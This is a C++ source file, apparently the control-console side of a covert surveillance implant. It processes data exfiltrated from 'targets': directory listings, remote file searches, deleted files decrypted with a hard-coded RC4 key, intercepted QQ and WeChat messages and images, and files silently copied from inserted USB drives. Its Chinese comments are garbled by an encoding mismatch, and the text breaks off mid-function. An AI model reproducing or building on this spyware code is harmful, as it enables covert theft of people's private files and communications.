//---------------------------------------------------------------------------

#include "AdkPrecomp.h"
#pragma hdrstop
#include "AdkMd5.h"
#include "AdkRc4.h"

#include "maindlg.h"
#include "target.h"
#include "DatabaseManager.h"
#include "targetdlg.h"
#include "ProcessFileTask.h"
#include "localDataDir.h"

#include "include/T5.h"
#include "include/T5UserAction.h"
#include "include/T5UsbConfig.h"
#include "include/T5Comm.h"

#include "include/T5Screen.h"
#include "AudioPlg.h"

//---------------------------------------------------------------------------
VOID SendMessageToTarControlFrm(Target *tarBlock,
                                UINT Msg,
                                WPARAM wParam,
                                LPARAM lParam)
{
    if (tarBlock == NULL)
    {
        return;
    }
    
    if (tarBlock->frmTarControl)
    {
        if (tarBlock->frmTarControl->bShowFlag)
        {
            SendMessage(tarBlock->frmTarControl->Handle, Msg, (UINT)wParam, (LONG)lParam);
        }
    }
}
//---------------------------------------------------------------------------
DWORD WINAPI ProcessDirInfo(PVOID pContext)
{
    // ���ڶ��Ŀ¼��Ϣ���أ������ļ���������Ŀ¼���ݴ�ŵ����ݿ���
    //

    FileTask *lpFileTask = (FileTask * )pContext;

    xASSERT((lpFileTask));

    HANDLE  hFile;
    time_t  dirTime;
    DWORD   dwPathLen;
    DWORD   dwDataSize;
    DWORD   dwByteReaded;
    PCHAR   lpszPathBase64 = NULL;
    PCHAR   lpszData = NULL;
    Target *tarBlock = NULL;

    do
    {
        hFile = CreateFileA(lpFileTask->aniTmpTaskPath.c_str(),
                           GENERIC_ALL,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL,
                           OPEN_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);

        if (hFile == INVALID_HANDLE_VALUE)
        {
            break;
        }

        // DirInfoHeader
        //
        DirInfoHeader	dirInfoHeader;
        if ( ! ReadFile(hFile, &dirInfoHeader, sizeof(DirInfoHeader), &dwByteReaded, NULL))
        {
            break;
        }

        if (dirInfoHeader.dwMagic != T5_FILE_MAGIC)
        {
            break;
        }

        FILETIME ft;
        FILETIME lft;
        SYSTEMTIME st;
        ft.dwLowDateTime = dirInfoHeader.liGetTime.LowPart;
        ft.dwHighDateTime = dirInfoHeader.liGetTime.HighPart;
        FileTimeToLocalFileTime(&ft, &lft);
        FileTimeToSystemTime(&lft, &st);

		CHAR szTimeStr[MAX_PATH] = {0};
		sprintf(szTimeStr, "%d-%d-%d %d:%d:%d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        
        // �ļ��ɶ�����µĽṹ���
        //      DirPathLen DirPathBase64 DirDataSize DirData
        //        0        1              2           3
        //

        do
        {
            // ��ȡPathLen��PathBase64
            //
            if ( ! ReadFile(hFile, &dwPathLen, sizeof(DWORD), &dwByteReaded, NULL))
            {
                break;
            }

            if (dwByteReaded == 0)
            {
                break;
            }

            lpszPathBase64 = (char *)AdkMalloc(dwPathLen + 1);
            if (lpszPathBase64 == NULL)
            {
                break;
            }

            if ( ! ReadFile(hFile, lpszPathBase64, dwPathLen, &dwByteReaded, NULL))
            {
                break;
            }

			std::wstring realPath = GetWideFromBase64(lpszPathBase64);

            if (dwByteReaded != dwPathLen)
            {
                break;
            }

            // ��ȡDataLen �� Data
            //
            if ( ! ReadFile(hFile, &dwDataSize, sizeof(DWORD), &dwByteReaded, NULL))
            {
                break;
            }

            if (dwByteReaded == 0)
            {
                break;
            }
            
            if (dwDataSize > 0)
            {
                lpszData = (char *)AdkMalloc(dwDataSize + 1);
                if (lpszData == NULL)
                {
                    break;
                }

                if ( ! ReadFile(hFile, lpszData, dwDataSize, &dwByteReaded, NULL))
                {
                    break;
                }

                if (dwByteReaded != dwDataSize)
                {
                    break;
                }
            }
            else
            {
                lpszData = NULL;
            }

            // �������ݿ�
            //
            if (tarBlock == NULL)
            {
                tarBlock = GetTargetFromGlobalMap(lpFileTask->dwTargetID);
            }

            if (tarBlock)
            {
                DM->AddOfflineDirInfo(tarBlock, szTimeStr, lpszPathBase64, lpszData);
            }

            if (lpszPathBase64)
            {
                AdkFree(lpszPathBase64);
                lpszPathBase64 = NULL;
            }

            if (lpszData)
            {
                AdkFree(lpszData);
                lpszData = NULL;
            }

        } while(TRUE);

    } while(FALSE);

    if (hFile != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hFile);
    }

    if (lpszPathBase64)
    {
        AdkFree(lpszPathBase64);
    }

    if (lpszData)
    {
        AdkFree(lpszData);
    }
        
    // Delete File
    //
    DeleteFileA(lpFileTask->aniTmpTaskPath.c_str());

    // ����ļ�����
    //
    if (tarBlock)
    {
        tarBlock->DeleteFileTask(lpFileTask);
    }
    else
    {
        delete lpFileTask;
    }

    return 0;
}
//---------------------------------------------------------------------------
DWORD WINAPI ProcessSearchInfo(PVOID pContext)
{
    // ����Զ��������Ϣ����, �����ļ��������ݴ�ŵ����ݿ���
    //

    FileTask *lpFileTask = (FileTask * )pContext;
    HANDLE    hFile;
    PBYTE     lpData = NULL;
    DWORD     dwSize;
    DWORD     dwByteReaded;
    Target    *tarBlock = GetTargetFromGlobalMap(lpFileTask->dwTargetID);

    do
    {
        PSearchTask lpSearchTask = tarBlock->GetSearchTaskFromMap(lpFileTask->dwParentID);
        if (lpSearchTask == NULL)
        {
            break;
        }

        hFile = CreateFileA(lpFileTask->aniTmpTaskPath.c_str(),
                           GENERIC_ALL,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL,
                           OPEN_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);

        if (hFile == INVALID_HANDLE_VALUE)
        {
            break;
        }

        dwSize = GetFileSize(hFile, NULL);

        if (dwSize > 0)
        {
            lpData = (PBYTE)malloc(dwSize + 1);
            ZeroMemory(lpData, dwSize + 1);

            if ( ! ReadFile(hFile, lpData, dwSize, &dwByteReaded, NULL))
            {
                break;
            }
        }

        DM->AddAsyncSearchInfo(lpFileTask->dwTargetID,
                               GetBase64FromWide(lpSearchTask->tarDirPathW),
                               lpSearchTask->dwLevel,
                               lpSearchTask->ulMinSize,
                               lpSearchTask->ulMaxSize,
                               lpSearchTask->ftBegTime,
                               lpSearchTask->ftEndTime,
                               GetBase64FromWide(lpSearchTask->widName),
                               GetBase64FromWide(lpSearchTask->widType),
                               (PCHAR)lpData);

    } while(FALSE);

    if (hFile != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hFile);
    }
        
    // Delete File
    //
    DeleteFileA(lpFileTask->aniTmpTaskPath.c_str());

    if (tarBlock)
    {
        if (tarBlock->frmTarControl)
        {
            SendMessage(tarBlock->frmTarControl->Handle, WM_UPDATE_SEARCHINFO, NULL, NULL);
        }
        
        tarBlock->DeleteFileTask(lpFileTask);
    }
    else
    {
        delete lpFileTask;
    }
    
    return 0;
}

//---------------------------------------------------------------------------
bool __fastcall ProcessDeletedFile(HANDLE hFile, Target *tarBlock)
{
    // ���ܹ���
    //      1. �Ƚ��ܵ���ʱĿ¼��
    //      2. ���ܳɹ�������DELĿ¼�н�����·��
    //      3. ���ļ�����ʱĿ¼������DELĿ¼�еĶ�Ӧ·����
    //
    //
    BOOL                    bRet = false;
    HANDLE                  hUncryptedFile = INVALID_HANDLE_VALUE;
    USER_DELFILE_HEADER     delFileHeader;
    DWORD                   dwByteReaded;
    DWORD                   dwByteWritten;
    WCHAR                   wzTmpFile[MAX_PATH];
    PBYTE                   lpFileData  = NULL;
    RC4_KEY					rc4Key;
    BYTE	                keyForRc4[8];

	keyForRc4[4] = '%';
	keyForRc4[5] = '+';
	keyForRc4[6] = 'w';
	keyForRc4[7] = 'f';
	keyForRc4[2] = ')';
	keyForRc4[0] = '#';
	keyForRc4[1] = '*';
    keyForRc4[3] = '(';
    
    do
    {
		// ������Կ
		//
		AdkBuildRc4Key(keyForRc4, 8, &rc4Key);

        // ��ȡͷ��
        //
        if ( ! ReadFile(hFile, &delFileHeader, sizeof(USER_DELFILE_HEADER), &dwByteReaded, NULL))
        {
            break;
        }

        // ��FileTaskingĿ¼��������ʱ�ļ�
        //
        wsprintfW(wzTmpFile, L"%s\\%d", tarBlock->widLocalDataDir.c_str(), GetTickCount());
        hUncryptedFile = CreateFileW(wzTmpFile,
                                   GENERIC_ALL,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
                                   NULL,
                                   CREATE_ALWAYS,
                                   FILE_ATTRIBUTE_NORMAL,
                                   NULL);
                                   
        if (INVALID_HANDLE_VALUE == hUncryptedFile)
        {
            xASSERT((false));
            break;
        }
        
        lpFileData = (PBYTE)AdkMalloc(512 * 1024);				// ÿ�ζ�д512K

		while(ReadFile(hFile, lpFileData, 512 * 1024, &dwByteReaded, NULL))
		{
			if (dwByteReaded == 0)
			{
				break;
			}
            
            // ����д��
			//
			AdkRc4Handler((BYTE *)lpFileData, dwByteReaded, &rc4Key);

			WriteFile(hUncryptedFile, lpFileData, dwByteReaded, &dwByteWritten, NULL);
		}

        bRet = true;

    } while(false);

    if (INVALID_HANDLE_VALUE != hUncryptedFile)
    {
        CloseHandle(hUncryptedFile);

        if ( !bRet)
        {
            // ɾ����ʱ�ļ�
            //
            DeleteFileW(wzTmpFile);
        }
    }

    if (lpFileData)
    {
        AdkFree(lpFileData);
    }

    if (!bRet)
    {
        return false;
    }

    // �����µ��ļ���   [�ļ�ɾ��ʱ��] + ��ʵ�ļ���
    //
	std::wstring widRealPath = delFileHeader.wzRealPath;
	std::wstring widSimuPath = CreateSubSimulateDir(tarBlock->widDelDataDir, widRealPath, UnixLike(tarBlock));  // �����ӷ���Ŀ¼

    SYSTEMTIME  sysTime;
    FILETIME    ftLocalTime;
    FileTimeToLocalFileTime(&delFileHeader.ftActionTime, &ftLocalTime);
    FileTimeToSystemTime(&ftLocalTime, &sysTime);
    WCHAR  wzTime[MAX_PATH];
    wsprintfW(wzTime, L"[%d-%02d-%02d %02d;%02d;%02d] ", sysTime.wYear, sysTime.wMonth, sysTime.wDay,
                    sysTime.wHour, sysTime.wMinute, sysTime.wSecond);

    const wchar_t* lpwzFileName = wcsrchr(widRealPath.c_str(), L'\\');
    lpwzFileName++;
                            
	std::wstring widDelFileName = std::wstring(wzTime) + std::wstring(lpwzFileName);   // ��ʵ�ļ���
	std::wstring widDelPath = PathMergeW(widSimuPath, widDelFileName);

    MoveFileW(wzTmpFile, widDelPath.c_str());

    // �����µ��ļ���ʱ��Ϊɾ��ǰ��ʱ��[���氡]
    //
    HANDLE hNewDelFile = CreateFileW(widDelPath.c_str(),
                               GENERIC_ALL,
                               FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL,
                               OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL,
                               NULL);
    if (INVALID_HANDLE_VALUE == hNewDelFile)
    {
        return FALSE;
    }

    SetFileTime(hNewDelFile,
                &delFileHeader.ftCreationTime,
                &delFileHeader.ftLastAccessTime,
                &delFileHeader.ftLastWriteTime);

    CloseHandle(hNewDelFile);

    return true;

}

extern ZlibUncompress g_zlibUncompress;

void ProcessIMData(std::vector<std::string>& args, char* buffer, int &pos, ULONG targetId)
{
	int dataLen = atoi(args[args.size()-2].c_str());
	int msgType = atoi(args[args.size()-3].c_str());
	std::wstring ext = GetWideFromBase64(args[args.size()-1]);
	char* start = buffer+pos;

	args.pop_back();
	args.pop_back();

	if ( msgType == 0 )
	{
		// �ı���Ϣ
		std::string msg(start, dataLen);
		args.push_back(WideToAnsi(GetWideFromBase64(msg)));
	}
	else
	{
		Target* tar = GetTargetFromGlobalMap(targetId);

		if ( tar )
		{
			std::wstring dir = tar->widLocalDataDir + L"\\AppCache";
			CreateDirectoryW(dir.c_str(), NULL);
			WCHAR fileName[MAX_PATH] = {0};

			DWORD buffLen = dataLen*4;
			char* outBuffer = new char[buffLen];    

			int errid = g_zlibUncompress(
				(BYTE*)outBuffer,
				&buffLen,
				(const BYTE*)start,
				dataLen);

			char h1 = outBuffer[0], h2 = outBuffer[1];

			// ΢�Ž� jpg Ҳ���� png ��������Ļ������ĺ�׺��
			if ( (BYTE)outBuffer[0] == 0xFF && (BYTE)outBuffer[1] == 0xD8 )
				ext = L"jpg";

			// Ϊ΢��¼���ļ����� amr ͷ
			/*if ( 0 == _wcsicmp(L"aud", ext.c_str()) )
			{
				buffLen += 6;
				for ( int i = buffLen-1; i != 5; --i )
				{
					outBuffer[i] = outBuffer[i-6];
				}
				memcpy(outBuffer, "#!AMR\n", 6);
				ext = L"amr";
			}*/

			wsprintfW(fileName, L"%s\\%d.%s", dir.c_str(), GetTickCount(), ext.c_str());
			Sleep(1);
			args.push_back(WideToAnsi(fileName));

			HANDLE hFile = CreateFileW(fileName, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

			if ( INVALID_HANDLE_VALUE == hFile )
			{
				int errNo = GetLastError();
				pos += dataLen;
				return;
			}
			
			DWORD write = 0;
			if ( !WriteFile(hFile, outBuffer, buffLen, &write, NULL) )
			{
				int errNo = GetLastError();
			}

			delete [] outBuffer;

			CloseHandle(hFile);
		}
	}

	pos += dataLen;
}


//---------------------------------------------------------------------------
int __fastcall ProcessUserActionItem(DWORD dwTargetId, char *buffer, int bufLen)
{
    char *begin  = NULL;
    char *end    = NULL;
    int  pos     = 0;
    int	 dataLen = 0;
    int  cmdLen  = 0;

    while(pos < bufLen)
    {
        begin = buffer + pos;
        while (strlen(begin) == 0)
        {
            begin++;
            pos++;            
        }

        end = strstr(begin,"\r\n");
        if (end == NULL)
        {
            break;
        }

        cmdLen = end - begin;
        std::string tmpReadLine = std::string(begin,cmdLen);
        std::vector<std::string> args = SplitString(tmpReadLine, " ");

        if (args.size() <= 1)
        {
            pos = pos + cmdLen + 2;
            continue;
        }
        
        dataLen = 0;
        if (args.size() >= 2)
        {
            if ("DATA" == args[1])
            {
                dataLen = atoi(args[args.size() - 1].c_str());
                if ((bufLen - (pos + cmdLen + 2)) < dataLen)
                {
                    break;
                }
            }
        }

        PDATA_BLOCK dataBlock = new DATA_BLOCK();
        dataBlock->targetId = dwTargetId;


        if (dataBlock->targetId == 0)

        {

            delete dataBlock;

            pos = pos + cmdLen + 2;

            continue;

        }

        

        dataBlock->args     = args;

        dataBlock->dataLen  = dataLen;

        dataBlock->next     = NULL;

        if (dataLen > 0)

        {

            end += 2;


            if (bufLen >= pos + cmdLen + 2 + dataLen)

            {

                dataBlock->data = std::string(end,dataLen);

                pos = pos + cmdLen + 2 + dataLen;

            }

            else

            {

                break;

            }

        }
        else
        {
            pos = pos + cmdLen + 2;
        }

		// QQ �� ΢�� ��Э�����⴦��
		if ( args.size() > 3
			&& args[0] == "APP" 
			&& args[2] == "MSG" )
		{
			ProcessIMData(dataBlock->args, buffer, pos, dataBlock->targetId);
		}

        FrmMain->PushPlgDataBlock(dataBlock);
    }

    return pos;
}

//---------------------------------------------------------------------------
void __fastcall ProcessUserPluginData(FileTask *lpFileTask, Target    *tarBlock)
{
    HANDLE hFile   ;
    char *readBuf = NULL;
    DWORD dwByteReaded;
    int  pos      = 0;
    int  procLen  = 0;
    DWORD dwTargetId = lpFileTask->dwTargetID;
    
    USER_ACT_FHEADER uafHeader;

    do
    {
        hFile = CreateFileA(lpFileTask->aniTmpTaskPath.c_str(),
                           GENERIC_ALL,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL,
                           OPEN_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);

        if (hFile == INVALID_HANDLE_VALUE)
        {
            break;
        }

        if ( ! ReadFile(hFile, &uafHeader, sizeof(USER_ACT_FHEADER), &dwByteReaded, NULL))
        {
            break;
        }

        if (dwByteReaded == 0)
        {
            break;
        }

        if (uafHeader.dwMagicNumber != T5_FILE_MAGIC)
        {
            break;
        }

        if (uafHeader.dwInfoType == 1)
        {
            // ɾ���ļ�
            //
            ProcessDeletedFile(hFile, tarBlock);
        }
        else    // �û���Ϊ
        {
            // malloc 16k
            //

			DWORD fileSize = GetFileSize(hFile, NULL);
            //readBuf = (char *)malloc(1024 * 1024 + 1);
			readBuf = new char[fileSize+1];

            if (NULL == readBuf)
            {
                break;
            }

            do
            {
                //if ( !ReadFile(hFile, readBuf + pos, 4096 * 2, &dwByteReaded, NULL))
				if ( !ReadFile(hFile, readBuf, fileSize, &dwByteReaded, NULL))
                {
                    break;
                }

                if (dwByteReaded == 0)
                {
                    break;
                }

                readBuf[pos + dwByteReaded] = '\0';

                // @@@ ��ǰֻ��������
                if (uafHeader.dwEncryptAlg == 1)
                {
                    AdkXorMemory(readBuf + pos, uafHeader.chKey, dwByteReaded);
                }

                procLen = ProcessUserActionItem(dwTargetId, readBuf, pos + dwByteReaded);
                if (procLen <= pos + dwByteReaded)
                {
                    pos = pos + dwByteReaded - procLen;
                    if (pos > 8192)
                    {
                        pos = 0;
                    }
                    else
                    {
                        MoveMemory(readBuf, readBuf + procLen, pos);
                    }
                }
                else
                {
                    pos = 0;
                }
                
            }while(true);
        }

    } while(false);

    if (hFile != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hFile);
    }

    if (readBuf)
    {
        delete [] readBuf;
    }

    // Delete File
    //
    DeleteFileA(lpFileTask->aniTmpTaskPath.c_str());

    return;
}
//---------------------------------------------------------------------------
void __fastcall ProcessUsbFile(HANDLE hFile, Target *tarBlock)
{
    DWORD   dwSize;
    DWORD   dwByteReaded;
    PUSB_FILE_DATA lpUsbFileHeader = NULL;
    HANDLE  hUsbFile;

    if ( ! ReadFile(hFile, &dwSize, sizeof(DWORD), &dwByteReaded, NULL))
    {
        return;
    }

    lpUsbFileHeader = (PUSB_FILE_DATA)AdkMalloc(dwSize);
    if ( ! ReadFile(hFile, ((PBYTE)(lpUsbFileHeader) + sizeof(DWORD)), dwSize - sizeof(DWORD), &dwByteReaded, NULL))
    {
        AdkFree(lpUsbFileHeader);
        return;
    }

    // �������ļ�����ʱ��  TimeOne�ǻ�ȡʱ�䣬TimeTwo������޸�ʱ��
    //
    AdkXorMemory((PCHAR)lpUsbFileHeader->wzUsbFilePath, lpUsbFileHeader->szKey, lpUsbFileHeader->dwSizeOfFilePath);

    WCHAR  wzTimeOne[64];
    WCHAR  wzTimeTwo[64];
    CHAR   szTime[128];
    PCHAR  szTimeOne = szTime;
    PCHAR  szTimeTwo = szTime + 64;
    SYSTEMTIME  sysTime;
    FILETIME    ftLocalTime;

    FileTimeToLocalFileTime(&lpUsbFileHeader->ftThief, &ftLocalTime);
    FileTimeToSystemTime(&ftLocalTime, &sysTime);

    // �����µ��ļ���   [�ļ���ȡʱ��] + ��ʵ�ļ���
    // �����ļ������ʰ�ʱ���е�:��Ϊ;
    wsprintfW(wzTimeOne, L"[%d-%02d-%02d %02d;%02d;%02d] ", sysTime.wYear, sysTime.wMonth, sysTime.wDay,
                sysTime.wHour, sysTime.wMinute, sysTime.wSecond);
	std::wstring widRealPath = lpUsbFileHeader->wzUsbFilePath;
	std::wstring widSimuPath = CreateSubSimulateDir(tarBlock->widUsbDataDir, widRealPath, UnixLike(tarBlock));
    const wchar_t* lpwzFileName = NULL;
	if ( UnixLike(tarBlock) )
	{
		lpwzFileName = wcsrchr(widRealPath.c_str(), L'/');
	}
	else
	{
		lpwzFileName = wcsrchr(widRealPath.c_str(), L'\\');
	}
    lpwzFileName++;
	std::wstring widUsbFileName = std::wstring(wzTimeOne) + std::wstring(lpwzFileName);   // ��ʵ�ļ���
	std::wstring widUsbPath = PathMergeW(widSimuPath, widUsbFileName);

    wsprintfW(wzTimeOne, L"%d-%02d-%02d %02d:%02d:%02d", sysTime.wYear, sysTime.wMonth, sysTime.wDay,
                sysTime.wHour, sysTime.wMinute, sysTime.wSecond);
    wsprintfA(szTimeOne, "%d-%02d-%02d %02d:%02d:%02d", sysTime.wYear, sysTime.wMonth, sysTime.wDay,
                sysTime.wHour, sysTime.wMinute, sysTime.wSecond);

    FileTimeToLocalFileTime(&lpUsbFileHeader->ftLastWrite, &ftLocalTime);
    FileTimeToSystemTime(&ftLocalTime, &sysTime);
    wsprintfW(wzTimeTwo, L"%d-%02d-%02d %02d:%02d:%02d", sysTime.wYear, sysTime.wMonth, sysTime.wDay,
                sysTime.wHour, sysTime.wMinute, sysTime.wSecond);
    wsprintfA(szTimeTwo, "%d-%02d-%02d %02d:%02d:%02d", sysTime.wYear, sysTime.wMonth, sysTime.wDay,
                sysTime.wHour, sysTime.wMinute, sysTime.wSecond);

    hUsbFile = CreateFileW(widUsbPath.c_str(),
                           GENERIC_ALL,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL,
                           CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL,
                           0);
                           
    if (hUsbFile == INVALID_HANDLE_VALUE)
    {
        AdkFree(lpUsbFileHeader);
        return;
    }

    BYTE byBuffer[4096];
    DWORD dwByteWritten;

    do
    {
        if ( !ReadFile(hFile, byBuffer, 4096, &dwByteReaded, 0))
        {
            break;
        }
        
        if (dwByteReaded == 0)
        {
            break;
        }

        AdkXorMemory(byBuffer, lpUsbFileHeader->szKey, dwByteReaded);

        // д���µ��ļ���
        //
        WriteFile(hUsbFile, byBuffer, dwByteReaded, &dwByteWritten, 0);

    } while(true);

    SetFileTime(hUsbFile,
                &lpUsbFileHeader->ftCreation,
                &lpUsbFileHeader->ftAccess,
                &lpUsbFileHeader->ftLastWrite);

    CloseHandle(hUsbFile);

    // �����USB�Զ���ȡ�ļ�����Ϣ��¼�����ݿ���
    //
    DM->AddUsbFile(tarBlock->dwTargetID,
                   GetBase64FromWide(widRealPath),
                   szTimeOne,
                   lpUsbFileHeader->dwSizeOfFile,
                   szTimeTwo);

    // д�뵽�ļ��б���
    //
	std::wstring widFileName = tarBlock->widUsbDataDir + L"\\FileList.txt";
    ExportUsbFileToLocal(tarBlock->dwTargetID,
                         widFileName.c_str(),
                         widRealPath.c_str(),
                         wzTimeOne,
                         wzTimeTwo,
                         lpUsbFileHeader->dwSizeOfFile);

    // ֪ͨ������и���
    //
    SendMessageToTarControlFrm(tarBlock, WM_UPDATE_USB_FILE, (UINT)szTime, (LONG)lpUsbFileHeader);

    // �ͷ��ڴ�
    //
    AdkFree(lpUsbFileHeader);

    return;
}

void __fastcall ProcessUsbDirMac(HANDLE hFile, Target *tarBlock)
{
	// USB�����Ϣ��Ŀ¼���ݣ������У�
	//
	FLASH_DISK_INFO_MAC usbDiskInfo;
	DWORD           dwByteReaded;

	if ( ! ReadFile(hFile, &usbDiskInfo, sizeof(FLASH_DISK_INFO_MAC), &dwByteReaded, NULL))
	{
		return;
	}

	if (dwByteReaded != sizeof(FLASH_DISK_INFO_MAC))
	{
		return;
	}

	// szTimeOne Ϊ����ʱ��
	// szTimeTwo Ϊ�γ�ʱ��
	//
	CHAR   szTime[128];
	PCHAR  szTimeOne = szTime;
	PCHAR  szTimeTwo = szTime + 64;

	SYSTEMTIME  sysTime;
	FILETIME    ftLocalTime;
	FileTimeToLocalFileTime(&usbDiskInfo.ftInsertTime, &ftLocalTime);
	FileTimeToSystemTime(&ftLocalTime, &sysTime);
	wsprintfA(szTimeOne, "%d-%02d-%02d %02d:%02d:%02d", sysTime.wYear, sysTime.wMonth, sysTime.wDay,
		sysTime.wHour, sysTime.wMinute, sysTime.wSecond);

	FileTimeToLocalFileTime(&usbDiskInfo.ftRemoveTime, &ftLocalTime);
	FileTimeToSystemTime(&ftLocalTime, &sysTime);
	wsprintfA(szTimeTwo, "%d-%02d-%02d %02d:%02d:%02d", sysTime.wYear, sysTime.wMonth, sysTime.wDay,
		sysTime.wHour, sysTime.wMinute, sysTime.wSecond);


	// ��U�̲�����¼�����ݿ���
	//
	DM->AddUsbOperation(tarBlock->dwTargetID,
		usbDiskInfo.dwFlashDiskId,
		std::wstring(usbDiskInfo.wzVolume),
		szTimeOne,
		szTimeTwo);

	// ��Ŀ¼
	//
	DWORD   dwLevel;
	DWORD   dwDirPathLen;
	DWORD   dwDirDataSize;
	PCHAR   lpszDirPath = NULL;
	PCHAR   lpszDirData = NULL;

	do
	{
		// �ļ����ݣ���LEVEL DirPathLen DirPathBase64 DirDataSize DirData		DirPathLen	Dir....
		//				0        1              2        3			4		  ....
		//
		if ( ! ReadFile(hFile, &dwLevel, sizeof(DWORD), &dwByteReaded, NULL))
		{
			break;
		}

		if (dwByteReaded == 0)
		{
			break;
		}

		if ( ! ReadFile(hFile, &dwDirPathLen, sizeof(DWORD), &dwByteReaded, NULL))
		{
			break;
		}

		if (dwByteReaded == 0)
		{
			break;
		}

		lpszDirPath = (PCHAR)malloc(dwDirPathLen + 1);
		memset(lpszDirPath, 0, dwDirPathLen + 1);
		if ( ! ReadFile(hFile, lpszDirPath, dwDirPathLen, &dwByteReaded, NULL))
		{
			break;
		}

		if (dwByteReaded == 0)
		{
			break;
		}

		if ( ! ReadFile(hFile, &dwDirDataSize, sizeof(DWORD), &dwByteReaded, NULL))
		{
			break;
		}

		if (dwByteReaded == 0)
		{
			break;
		}

		// ����ǿ�Ŀ¼����dwDirDataSizeΪ0
		//
		if (dwDirDataSize > 0)
		{
			lpszDirData = (PCHAR)malloc(dwDirDataSize + 1);
			memset(lpszDirData, 0, dwDirDataSize+1);
			if ( ! ReadFile(hFile, lpszDirData, dwDirDataSize, &dwByteReaded, NULL))
			{
				break;
			}

			if (dwByteReaded == 0)
			{
				break;
			}

			DM->AddUsbDirInfo(tarBlock->dwTargetID,
				usbDiskInfo.dwFlashDiskId,
				szTimeOne,
				lpszDirPath,
				lpszDirData);


			free(lpszDirData);
			lpszDirData = NULL;
		}

		free(lpszDirPath);
		lpszDirPath = NULL;

	} while(true);

	// ֪ͨ������и���
	//
	SendMessageToTarControlFrm(tarBlock, WM_UPDATE_USB_OP, (UINT)szTime, (LONG)&usbDiskInfo);

	if (lpszDirPath)
	{
		free(lpszDirPath);
	}

	if (lpszDirData)
	{
		free(lpszDirData);
	}
}

//---------------------------------------------------------------------------
void __fastcall ProcessUsbDir(HANDLE hFile, Target *tarBlock)
{
    // USB�����Ϣ��Ŀ¼���ݣ������У�
    //
    FLASH_DISK_INFO usbDiskInfo;
    DWORD           dwByteReaded;

    if ( ! ReadFile(hFile, &usbDiskInfo, sizeof(FLASH_DISK_INFO), &dwByteReaded, NULL))
    {
        return;
    }

    if (dwByteReaded != sizeof(FLASH_DISK_INFO))
    {
        return;
    }

    // szTimeOne Ϊ����ʱ��
    // szTimeTwo Ϊ�γ�ʱ��
    //
    CHAR   szTime[128];
    PCHAR  szTimeOne = szTime;
    PCHAR  szTimeTwo = szTime + 64;
        
    SYSTEMTIME  sysTime;
    FILETIME    ftLocalTime;
    FileTimeToLocalFileTime(&usbDiskInfo.ftInsertTime, &ftLocalTime);
    FileTimeToSystemTime(&ftLocalTime, &sysTime);
    wsprintfA(szTimeOne, "%d-%02d-%02d %02d:%02d:%02d", sysTime.wYear, sysTime.wMonth, sysTime.wDay,
                sysTime.wHour, sysTime.wMinute, sysTime.wSecond);

    FileTimeToLocalFileTime(&usbDiskInfo.ftRemoveTime, &ftLocalTime);
    FileTimeToSystemTime(&ftLocalTime, &sysTime);
    wsprintfA(szTimeTwo, "%d-%02d-%02d %02d:%02d:%02d", sysTime.wYear, sysTime.wMonth, sysTime.wDay,
                sysTime.wHour, sysTime.wMinute, sysTime.wSecond);


    // ��U�̲�����¼�����ݿ���
    //
    DM->AddUsbOperation(tarBlock->dwTargetID,
                        usbDiskInfo.dwFlashDiskId,
						std::wstring(usbDiskInfo.wzVolume),
                        szTimeOne,
                        szTimeTwo);

    // ��Ŀ¼
    //
    DWORD   dwLevel;
    DWORD   dwDirPathLen;
    DWORD   dwDirDataSize;
    PCHAR   lpszDirPath = NULL;
    PCHAR   lpszDirData = NULL;
         
     do
     {
        // �ļ����ݣ���LEVEL DirPathLen DirPathBase64 DirDataSize DirData		DirPathLen	Dir....
        //				0        1              2        3			4		  ....
        //
        if ( ! ReadFile(hFile, &dwLevel, sizeof(DWORD), &dwByteReaded, NULL))
        {
            break;
        }

        if (dwByteReaded == 0)
        {
            break;
        }
                
        if ( ! ReadFile(hFile, &dwDirPathLen, sizeof(DWORD), &dwByteReaded, NULL))
        {
            break;
        }

        if (dwByteReaded == 0)
        {
            break;
        }
            
        lpszDirPath = (PCHAR)malloc(dwDirPathLen + 1);
		memset(lpszDirPath, 0, dwDirPathLen + 1);
        if ( ! ReadFile(hFile, lpszDirPath, dwDirPathLen, &dwByteReaded, NULL))
        {
            break;
        }

        if (dwByteReaded == 0)
        {
            break;
        }

        if ( ! ReadFile(hFile, &dwDirDataSize, sizeof(DWORD), &dwByteReaded, NULL))
        {
            break;
        }

        if (dwByteReaded == 0)
        {
            break;
        }

        // ����ǿ�Ŀ¼����dwDirDataSizeΪ0
        //
        if (dwDirDataSize > 0)
        {
            lpszDirData = (PCHAR)malloc(dwDirDataSize + 1);
			memset(lpszDirData, 0, dwDirDataSize + 1);
            if ( ! ReadFile(hFile, lpszDirData, dwDirDataSize, &dwByteReaded, NULL))
            {
                break;
            }

            if (dwByteReaded == 0)
            {
                break;
            }

            DM->AddUsbDirInfo(tarBlock->dwTargetID,
                              usbDiskInfo.dwFlashDiskId,
                              szTimeOne,
                              lpszDirPath,
                              lpszDirData);


            free(lpszDirData);
            lpszDirData = NULL;
        }

        free(lpszDirPath);
        lpszDirPath = NULL;
                              
    } while(true);

    // ֪ͨ������и���
    //
    SendMessageToTarControlFrm(tarBlock, WM_UPDATE_USB_OP, (UINT)szTime, (LONG)&usbDiskInfo);

    if (lpszDirPath)
    {
        free(lpszDirPath);
    }

    if (lpszDirData)
    {
        free(lpszDirData);
    }
}

//---------------------------------------------------------------------------
void __fastcall ProcessUsbPluginData(FileTask *lpFileTask, Target    *tarBlock)
{
    USB_COMMON_HEADER usbCommHeader;

	std::string aniPath = lpFileTask->aniTmpTaskPath;

